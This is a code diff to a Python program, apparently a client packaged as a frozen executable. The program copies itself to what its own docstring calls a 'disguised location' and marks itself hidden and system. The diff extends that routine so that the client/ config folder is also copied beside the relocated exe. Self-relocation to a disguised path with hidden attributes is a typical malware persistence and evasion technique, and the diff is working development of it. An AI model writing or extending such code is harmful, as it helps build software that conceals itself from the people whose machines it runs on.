@@ -90,7 +90,8 @@ def _install_path() -> Path:
 def _maybe_relocate() -> Path:
     """
     If running as a frozen exe NOT already in the disguised location,
-    copy there and set hidden+system attributes. Returns the install path.
+    copy the exe AND the client/ config folder there.
+    Returns the install path.
     """
     if not getattr(sys, "frozen", False):
         return Path(sys.executable)
@@ -102,12 +103,34 @@ def _maybe_relocate() -> Path:
         try:
             shutil.copy2(str(current), str(install))
             _set_hidden(install)
-            log.info("Relocated to %s", install)
+            log.info("Relocated exe to %s", install)
         except Exception as exc:
             log.warning("Relocation failed: %s", exc)
             return current
 
+    # Always ensure config folder exists at install location
+    # (covers both first-time relocation and the case where it was missing)
+    _copy_config_folder(current.parent, install.parent)
+
     return install
+
+
+def _copy_config_folder(src_dir: Path, dst_dir: Path) -> None:
+    """Copy the client/ subfolder (config.yaml etc.) next to the relocated exe."""
+    src_client = src_dir / "client"
+    dst_client = dst_dir / "client"
+    if not src_client.exists():
+        log.warning("client/ folder not found at %s — config will be missing", src_dir)
+        return
+    try:
+        dst_client.mkdir(parents=True, exist_ok=True)
+        for item in src_client.iterdir():
+            dest = dst_client / item.name
+            if item.is_file():
+                shutil.copy2(str(item), str(dest))
+        log.info("Copied client/ config folder to %s", dst_client)
+    except Exception as exc:
+        log.warning("Failed to copy config folder: %s", exc)
 
 
 def _set_hidden(path: Path) -> None:
